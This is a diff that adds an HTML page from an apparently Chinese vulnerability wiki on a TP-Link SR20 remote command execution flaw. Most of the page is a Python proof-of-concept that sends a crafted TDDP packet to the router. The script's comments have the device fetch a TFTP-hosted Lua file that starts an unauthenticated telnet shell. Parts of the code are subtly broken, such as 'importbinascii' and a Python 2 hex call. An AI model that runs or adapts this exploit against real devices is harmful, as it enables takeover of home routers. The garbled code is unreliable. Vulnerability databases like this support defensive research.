@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>TP-Link SR20 远程命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "TP-Link SR20 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../TP-Link%20TL-WR841N%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-35576/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../TP-Link%20TL-WR841N%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-35576/" class="btn btn-xs btn-link">
+        TP-Link TL-WR841N 远程代码执行漏洞 CVE-2020-35576
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../TP-Link%20AC1750%20%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-27246/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../TP-Link%20AC1750%20%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-27246/" class="btn btn-xs btn-link">
+        TP-Link AC1750 预认证远程代码执行漏洞CVE-2021-27246
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="tp-link-sr20">TP-Link SR20 远程命令执行<a class="headerlink" href="#tp-link-sr20" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>TP-Link SR20
+</code></pre></div>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+<span class="c1"># Create /testfile in your tftp root directory with the followingcontents:</span>
+<span class="c1">#function config_test(config)</span>
+<span class="c1"># os.execute(&quot;telnetd -l/bin/login.sh&quot;)</span>
+<span class="c1">#end</span>
+<span class="c1"># Replace 192.168.0.1 with the IP address of the vulnerable device</span>
+<span class="n">importbinascii</span>
+<span class="n">importsocket</span>
+<span class="n">port_send</span> <span class="o">=</span> <span class="mi">1040</span>
+<span class="n">port_receive</span> <span class="o">=</span> <span class="mi">61000</span>
+<span class="n">tddp_ver</span> <span class="o">=</span> <span class="s2">&quot;01&quot;</span>
+<span class="n">tddp_command</span> <span class="o">=</span> <span class="s2">&quot;31&quot;</span>
+<span class="n">tddp_req</span> <span class="o">=</span> <span class="s2">&quot;01&quot;</span>
+<span class="n">tddp_reply</span> <span class="o">=</span> <span class="s2">&quot;00&quot;</span>
+<span class="n">tddp_padding</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%0.16X</span><span class="s2">&quot;</span><span class="o">%</span> <span class="mi">00</span>
+<span class="n">tddp_packet</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">tddp_ver</span><span class="p">,</span> <span class="n">tddp_command</span><span class="p">,</span> <span class="n">tddp_req</span><span class="p">,</span><span class="n">tddp_reply</span><span class="p">,</span> <span class="n">tddp_padding</span><span class="p">])</span>
+<span class="n">sock_receive</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock_receive</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">port_receive</span><span class="p">))</span>
+
+<span class="c1"># Send a request</span>
+<span class="n">sock_send</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">tddp_packet</span><span class="p">)</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="n">packet</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;/testfile;arbitrary&quot;</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+<span class="n">sock_send</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="p">(</span> <span class="s2">&quot;192.168.0.1&quot;</span><span class="p">,</span> <span class="n">port_send</span><span class="p">))</span>
+<span class="n">sock_send</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">response</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock_receive</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span> <span class="mi">1024</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span> <span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../TP-Link%20TL-WR841N%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-35576/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../TP-Link%20TL-WR841N%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-35576/" class="btn btn-xs btn-link">
+        TP-Link TL-WR841N 远程代码执行漏洞 CVE-2020-35576
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../TP-Link%20AC1750%20%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-27246/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../TP-Link%20AC1750%20%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-27246/" class="btn btn-xs btn-link">
+        TP-Link AC1750 预认证远程代码执行漏洞CVE-2021-27246
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
